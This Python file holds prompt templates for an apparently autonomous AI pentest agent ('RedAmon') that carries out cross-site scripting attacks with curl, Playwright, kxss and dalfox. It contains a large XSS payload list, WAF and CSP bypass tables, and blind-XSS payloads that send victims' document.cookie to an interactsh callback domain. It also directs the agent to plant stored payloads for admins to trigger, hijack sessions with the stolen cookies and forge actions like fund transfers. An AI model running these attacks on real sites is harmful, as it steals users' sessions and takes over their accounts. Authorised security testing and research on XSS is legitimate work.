"""
RedAmon Cross-Site Scripting (XSS) Prompts

Prompts for XSS attack workflows covering reflected, stored, DOM-based, and blind XSS.
Uses Playwright for DOM-sink detection and dialog-based proof, dalfox for WAF evasion,
kxss for per-character filter probing, and interactsh-client for blind callbacks.
"""


# =============================================================================
# XSS MAIN WORKFLOW
# =============================================================================

XSS_TOOLS = """
## ATTACK SKILL: CROSS-SITE SCRIPTING (XSS)

**CRITICAL: This attack skill has been CLASSIFIED as Cross-Site Scripting.**
**You MUST follow the XSS workflow below. Do NOT switch to other attack methods.**

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
dalfox automated WAF evasion: {xss_dalfox_enabled}
Blind XSS callbacks (interactsh): {xss_blind_callback_enabled}
CSP bypass guidance:           {xss_csp_bypass_enabled}
```

**Canary string (use this, NOT random text):** `rEdAm0n1337XsS`
- Mixed-case, contains digits, no special chars -- survives most filters intact
- Easy to grep for in responses without false positives

**Hard rules:**
- NEVER use raw `alert()` text alone as proof. The agent MUST capture it via Playwright `page.on("dialog", ...)` so the trace contains evidence.
- NEVER spray payloads on every parameter blindly. Run the canary sweep (Step 3) and the per-char filter probe (Step 3b) FIRST -- blind spraying is noisy and gets WAFed.
- ALWAYS check for `Content-Security-Policy` response header before crafting payloads. CSP changes everything.

---

## MANDATORY XSS WORKFLOW

### Step 1: Reuse recon (query_graph, <5s)

BEFORE rendering anything, pull what recon already discovered:

```cypher
MATCH (e:Endpoint) WHERE e.url CONTAINS '<target_host>' RETURN e.url, e.method LIMIT 50
MATCH (p:Parameter) WHERE p.endpoint CONTAINS '<target_host>' RETURN p.name, p.location, p.endpoint LIMIT 100
MATCH (b:BaseURL) WHERE b.url CONTAINS '<target_host>' RETURN b.url
MATCH (t:Technology) WHERE t.host CONTAINS '<target_host>' RETURN t.name, t.version
```

If the graph already has Endpoints/Parameters, skip discovery and jump to Step 3 with the existing parameter list. Note any frontend framework (React/Angular/Vue) -- it changes context detection and CSP bypass strategy.

**After Step 1, request `transition_phase` to exploitation before proceeding to Step 2.**

### Step 2: Surface input vectors (execute_playwright, content mode)

If recon data is sparse or missing, render the page with a real browser to enumerate inputs that curl cannot see (JS-injected forms, SPA-rendered fields):

```
execute_playwright({{
  "url": "http://TARGET/path",
  "selector": "form",
  "format": "html"
}})
```

Then enumerate:
- Every `<form action=... method=...>` and its `<input name=...>` / `<textarea name=...>` / `<select name=...>` children
- Every URL parameter in `<a href=...>` links
- Every `<iframe src=...>` (potential injection target)
- Inline JS sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`, `localStorage`, `sessionStorage`
- Look for `data-*` attributes consumed by JS (often unsanitized)

### Step 3: Canary reflection sweep (execute_curl)

Inject the canary `rEdAm0n1337XsS` into EVERY discovered parameter (one at a time) and grep the response:

```
execute_curl({{"args": "-s 'http://TARGET/path?param1=rEdAm0n1337XsS&param2=normal'"}})
execute_curl({{"args": "-s -X POST -d 'name=rEdAm0n1337XsS&email=test@x.com' http://TARGET/submit"}})
execute_curl({{"args": "-s -H 'User-Agent: rEdAm0n1337XsS' http://TARGET/path"}})
execute_curl({{"args": "-s -H 'Referer: http://x/?rEdAm0n1337XsS' http://TARGET/path"}})
execute_curl({{"args": "-s -b 'tracking=rEdAm0n1337XsS' http://TARGET/path"}})
```

For each reflected canary, **inspect the 30 chars before and after** it in the response to determine context:
- Surrounded by HTML tags / text content -> **HTML body context**
- Inside `attr="..."` or `attr='...'` -> **HTML attribute context (quoted)**
- Inside `attr=...` (no quotes) -> **HTML attribute context (unquoted)**
- Inside `<script>...var x = "..."...</script>` -> **JavaScript string context**
- Inside `<script>...x = ...;</script>` (no quotes around it) -> **JavaScript code context**
- Inside `<style>...</style>` or `style="..."` -> **CSS context**
- Inside `href=`, `src=`, `action=`, `formaction=` -> **URL context**
- NOT in response body but in `Location:` header -> **Header injection / open redirect**

If the canary is NOT in the response body but the page renders dynamically, repeat with `execute_playwright` (it executes JS, so client-side reflections show up).

### Step 3b: Per-char filter probe (kali_shell -> kxss)

For each parameter that reflected the canary in Step 3, run kxss to learn which dangerous chars survive unescaped:

```
kali_shell({{"command": "echo 'http://TARGET/path?param=rEdAm0n1337XsS' | kxss"}})
```

Output lists which of `< > " ' ( ) ;` make it through unfiltered for that parameter. This tells you upfront which payload class is even possible:
- All chars survive -> any payload works, pick the simplest
- Only `"` and `'` survive (no `<`/`>`) -> attribute-breakout only, no tag injection
- Only `(` and `;` survive -> JS-context payloads only, no HTML
- Nothing dangerous survives -> filter is strong, escalate to Step 7 (dalfox bypass)

**Cross-reference Step 3b output with Step 3 context** before picking a payload. Don't try `<script>` if `<` is encoded.

### Step 4: Context-aware payload selection

Pick from `XSS Payload Reference` (separate section below) using BOTH the context (Step 3) AND the surviving chars (Step 3b):

| Context | Payload class | Look up |
|---------|---------------|---------|
| HTML body | tag injection | "HTML body context" payloads |
| Attribute (quoted) | quote breakout + event handler | "Attribute context (quoted)" payloads |
| Attribute (unquoted) | space + event handler | "Attribute context (unquoted)" payloads |
| JS string | escape quote + statement injection | "JavaScript string context" payloads |
| JS code | direct expression | "JavaScript code context" payloads |
| CSS | `</style>` breakout or expression() | "CSS context" payloads |
| URL (href/src) | `javascript:` URI | "URL context" payloads |
| Unknown / multiple | polyglot | "Polyglots" payloads |

Test ONE payload at a time. Confirm it appears unescaped in the response with execute_curl, THEN move to Step 6 to verify execution in a browser.

### Step 5: DOM XSS via Playwright script mode

Reflected/stored XSS lives in HTTP responses. DOM XSS lives entirely in the browser -- the server never sees the payload. Use Playwright script mode to install console+dialog handlers, then navigate with a source-tainted URL.

Build the script as a Python string and pass via `script` arg. The runtime exposes pre-initialized `browser`, `context`, `page` variables. Pattern (use the dialog-handler proof from Step 6 -- DOM XSS fires the same `alert()` events):

1. Wire `page.on("console", ...)` and `page.on("dialog", ...)` to capture firings.
2. Optionally call `page.add_init_script(JS_HOOK)` BEFORE `page.goto(...)` to monkey-patch `innerHTML` / `eval` / `document.write` on the page so every value passed to those sinks is `console.log`-ed. Build `JS_HOOK` as a regular JS string -- it is NOT subject to Python `.format()` escaping when placed inside `script`.
3. Navigate to the target with the source-tainted URL (e.g. `?q=<svg onload=alert(1)>` or `#<img src=x onerror=alert(1)>`).
4. `page.wait_for_timeout(2000)` to let JS run, then `print()` the captured events.

Sources to test (one at a time, append to URL or set programmatically):
- `location.hash`: `#<img src=x onerror=alert(1)>`
- `location.search`: `?q=<img src=x onerror=alert(1)>`
- `document.referrer`: navigate with `Referer:` header
- `window.name`: set via `window.open` from another page
- `postMessage`: send via `page.evaluate("window.postMessage('<img src=x onerror=alert(1)>', '*')")`
- `localStorage` / `sessionStorage`: pre-populate with `page.evaluate("localStorage.setItem('x', '...')")`

Sinks that execute code: `innerHTML`, `outerHTML`, `eval`, `setTimeout(string)`, `setInterval(string)`, `Function(string)`, `document.write`, `document.writeln`, `location` (assignment), `location.href`, `iframe.src` (with `javascript:`).

### Step 6: Verify execution (Playwright dialog handler)

This is the canonical XSS proof. The dialog handler captures `alert()`/`confirm()`/`prompt()` firings from the actual rendered page:

```python
script = '''
captured = []
page.on("dialog", lambda d: (captured.append({{"type": d.type, "message": d.message, "url": page.url}}), d.dismiss()))
page.goto("http://TARGET/path?param=" + "<svg onload=alert(\\\\'XSS-PROOF\\\\')>")
page.wait_for_timeout(3000)
if captured:
    print("XSS CONFIRMED:", captured)
else:
    print("No dialog fired -- payload did not execute")
'''
execute_playwright({{"script": script}})
```

If dialog fires -> XSS confirmed, capture the URL and payload as the proof artifact, move to Step 8 (impact).
If dialog does NOT fire but the payload appears in HTML source -> filter is encoding output (HTML entity encoding likely). Either pick a different context payload from `XSS_PAYLOAD_REFERENCE` or move to Step 7 (WAF bypass).

### Step 7: WAF / filter bypass via dalfox (when manual payloads fail)

ONLY trigger if Steps 4-6 failed (payload reflected but encoded, or blocked by WAF). Run dalfox in the background since it can take several minutes:

```
kali_shell({{"command": "dalfox url 'http://TARGET/path?param=test' --silence --waf-evasion --deep-domxss --mining-dom -o /tmp/dalfox.json --format json > /tmp/dalfox.log 2>&1 & echo $!"}})
```

Save the PID. Poll progress:

```
kali_shell({{"command": "tail -n 50 /tmp/dalfox.log"}})
kali_shell({{"command": "ps -p SAVED_PID > /dev/null && echo RUNNING || echo DONE"}})
```

When DONE, parse results:

```
kali_shell({{"command": "cat /tmp/dalfox.json | jq -r '.[] | select(.type==\\"V\\") | .data'"}})
```

Each `type=V` entry is a verified working payload from dalfox. Take one and re-verify in Playwright (Step 6) for the captured-dialog proof.

For POST data:
```
dalfox url 'http://TARGET/submit' --data 'name=test&msg=test' --method POST --silence --waf-evasion -o /tmp/dalfox.json --format json
```

For headers:
```
dalfox url 'http://TARGET/path' -H 'Cookie: session=abc' --silence --waf-evasion -o /tmp/dalfox.json --format json
```

### Step 8: Prove impact

Pick ONE based on what's available:

**Option A -- Cookie theft via blind callback** (if `xss_blind_callback_enabled` is True):
See the "OOB / Blind XSS Workflow" section. The interactsh callback receives the stolen `document.cookie` from the victim's browser.

**Option B -- Session hijack via Playwright** (works without OOB infrastructure):
```python
script = '''
# Open second browser context, inject the stolen cookie, hit an authenticated endpoint
victim_cookie = "session=ABC123"  # captured from XSS-fired payload via blind callback or test data
ctx2 = browser.new_context()
ctx2.add_cookies([{{"name": "session", "value": "ABC123", "url": "http://TARGET"}}])
page2 = ctx2.new_page()
page2.goto("http://TARGET/account")
print("Hijacked page title:", page2.title())
print("Hijacked page body:", page2.content()[:500])
'''
execute_playwright({{"script": script}})
```

**Option C -- Authenticated action forgery** (if XSS hits an authenticated user):
Demonstrate that the payload can fire a same-origin XHR/fetch that performs an action (change password, transfer funds, etc.) the attacker could not do directly.

Once impact is proven, set `action='complete'` with the captured PoC payload + execution evidence (dialog message, hijack page title, or callback log entry).
"""


# =============================================================================
# OOB / BLIND XSS WORKFLOW (interactsh-client)
# =============================================================================

XSS_BLIND_WORKFLOW = """
## OOB / Blind XSS Workflow (interactsh callbacks)

**Use this when:** Stored XSS in admin panels (you cannot trigger it yourself), or when the payload context is hidden from you (server-side log viewers, internal dashboards). The payload exfiltrates `document.cookie` (or other browser data) to an attacker-controlled callback domain when an unsuspecting user (admin/moderator) views the injected content.

---

### Step 1: Start interactsh-client as a background process

```
kali_shell({"command": "interactsh-client -server oast.fun -json -v > /tmp/interactsh.log 2>&1 & echo $!"})
```

**Save the PID** for later cleanup.

### Step 2: Read the registered callback domain

```
kali_shell({"command": "sleep 5 && head -20 /tmp/interactsh.log"})
```

Look for a line containing the `.oast.fun` domain (e.g. `abc123xyz.oast.fun`).

**CRITICAL:** This domain is cryptographically registered with the server. Random strings will NOT work -- you MUST use the domain printed in the log.

### Step 3: Inject blind XSS payloads pointing at the registered domain

Generic HTML body injection:
```
"><img src=x onerror="fetch('http://REGISTERED_DOMAIN/?c='+btoa(document.cookie))">
```

JavaScript string context (escape + exfiltrate):
```
';fetch('http://REGISTERED_DOMAIN/?c='+btoa(document.cookie));//
```

SVG no-quote (bypasses some filters):
```
<svg/onload=fetch(`//REGISTERED_DOMAIN?c=${document.cookie}`)>
```

DNS-only exfil (when HTTP is blocked outbound):
```
<img src=x onerror="new Image().src='//'+btoa(document.cookie).slice(0,50)+'.REGISTERED_DOMAIN'">
```

dalfox blind mode (auto-tests many payloads with the callback):
```
kali_shell({"command": "dalfox url 'http://TARGET/path?param=test' -b REGISTERED_DOMAIN --silence -o /tmp/dalfox.json --format json"})
```

### Step 4: Submit payloads into stored fields

Target: comment forms, profile bio, support tickets, contact-us forms, error log viewers, search history, anywhere the payload will be RENDERED LATER by another user (typically an admin or moderator).

Submit via execute_curl or Playwright (multipart/form data). Then wait. Blind XSS may take minutes to hours to fire depending on how often the admin views the page.

### Step 5: Poll for callbacks

```
kali_shell({"command": "tail -50 /tmp/interactsh.log"})
```

Look for JSON lines with:
- `"protocol":"http"` -- the cookie is in the URL query string (decode with `base64 -d` if you used `btoa`)
- `"protocol":"dns"` -- DNS-only exfil; the data is in the subdomain prefix
- `"remote-address"` -- the IP of the victim browser (often an internal admin host)

### Step 6: Cleanup

```
kali_shell({"command": "kill SAVED_PID"})
kali_shell({"command": "rm /tmp/interactsh.log /tmp/dalfox.json /tmp/dalfox.log 2>/dev/null"})
```
"""


# =============================================================================
# XSS PAYLOAD REFERENCE
# =============================================================================

XSS_PAYLOAD_REFERENCE = """
## XSS Payload Reference

Look up payloads by the context detected in Step 3 of the main workflow. Always test the simplest payload first; only escalate complexity if the simple one is filtered.

### HTML body context
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
```

### Attribute context (quoted with " or ')
Break out of the quote, then inject an event handler:
```
" onfocus=alert(1) autofocus="
' onmouseover=alert(1) x='
"><img src=x onerror=alert(1)>
'><svg onload=alert(1)>
" autofocus onfocus=alert(1) "
```

### Attribute context (unquoted)
Just add a space and the event handler:
```
 onfocus=alert(1) autofocus
/onfocus=alert(1)/autofocus/
 onmouseover=alert(1)
```

### JavaScript string context (inside "..." or '...')
Close the string, run code, comment out the rest:
```
';alert(1);//
";alert(1);//
\\\\';alert(1);//
</script><script>alert(1)</script>
';alert(1)//<!--
```

### JavaScript code context (no surrounding quotes)
Inject directly as an expression:
```
alert(1)
(alert)(1)
[].constructor.constructor("alert(1)")()
top["al"+"ert"](1)
window["al"+"ert"](1)
```

### URL context (href, src, action, formaction)
```
javascript:alert(1)
JaVaScRiPt:alert(1)
javascript:alert(1)//
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### CSS context (inside <style> or style="...")
```
</style><script>alert(1)</script>
expression(alert(1))            (legacy IE only)
@import "javascript:alert(1)";  (legacy IE only)
background:url("javascript:alert(1)")
```

### DOM-fragment context (location.hash, location.search)
The fragment never reaches the server -- it must be set client-side (browser address bar or window.open):
```
#<img src=x onerror=alert(1)>
#javascript:alert(1)
?q=<img src=x onerror=alert(1)>
```

### Polyglots (try when context is unknown or you only get one shot)

Brute Logic polyglot (works across HTML, JS, attribute, URL contexts):
```
jaVasCript:/*-/*`/*\\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e
```

Compact polyglot:
```
"><svg/onload=alert()>
```

Ultra-short (when length-limited):
```
<svg onload=alert(1)>
```

### Filter / WAF bypass quick reference

| Technique | Example | Use when |
|-----------|---------|----------|
| URL-encode | `%3Cscript%3Ealert(1)%3C/script%3E` | `<` or `>` blocked literally |
| Double URL-encode | `%253Cscript%253E` | Single-decode WAF |
| HTML entity | `&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;` | Reflection inside HTML decoder |
| Unicode escape (JS) | `\\\\u003cscript\\\\u003ealert(1)\\\\u003c/script\\\\u003e` | JS context only |
| Case variation | `<ScRiPt>alert(1)</ScRiPt>` | Case-sensitive WAF |
| Null byte | `<scri\\x00pt>alert(1)</scri\\x00pt>` | Legacy parsing |
| Comment break | `<scr<!--x-->ipt>alert(1)</scr<!--x-->ipt>` | Keyword filters |
| Tag soup escape | `</textarea><svg onload=alert(1)>` | Reflection inside `<textarea>` |
| Closing-context escape | `</title><svg onload=alert(1)>` | Reflection inside `<title>` |
| `javascript:` schema variants | `JaVaScRiPt:`, `java\\tscript:`, `java\\nscript:` | URL filter blocks lowercase |
| String concat (no quotes) | `top[/al/.source+/ert/.source](1)` | Quote-stripping filter |
| Backtick template (no quotes) | `` setTimeout`alert\\x281\\x29` `` | Quote-stripping filter |

### CSP bypass shortcuts

When the response has a `Content-Security-Policy` header, parse it FIRST:

| CSP weakness | Bypass |
|--------------|--------|
| `script-src 'unsafe-inline'` | Direct `<script>alert(1)</script>` works |
| `script-src 'unsafe-eval'` | `eval`, `new Function`, `setTimeout(string)` work |
| `script-src 'self'` (and you have file upload) | Upload `x.js` containing `alert(1)`, then `<script src=/uploads/x.js>` |
| `script-src https://www.google.com ...` (JSONP allowed) | `<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)">` |
| `script-src 'nonce-XYZ'` (nonce reused or in HTML) | Extract nonce from page source, reuse: `<script nonce=XYZ>alert(1)</script>` |
| Angular detected (`ng-app`) | Template injection: `{{constructor.constructor('alert(1)')()}}` |
| Vue detected | Template injection: `{{_c.constructor('alert(1)')()}}` |
| AngularJS detected | `{{$on.constructor('alert(1)')()}}` |
| `default-src 'none'` and no script-src | Often misses `<base>` tag -- inject `<base href=//evil.com>` to redirect script loads |
| Missing `frame-ancestors` | Frame the page from your origin and use postMessage attack |

If CSP is `default-src 'none'; script-src 'none'` AND no upload, AND no JSONP, AND no template engine -- you're stuck. Document the CSP as the primary control and report XSS as defended.
"""
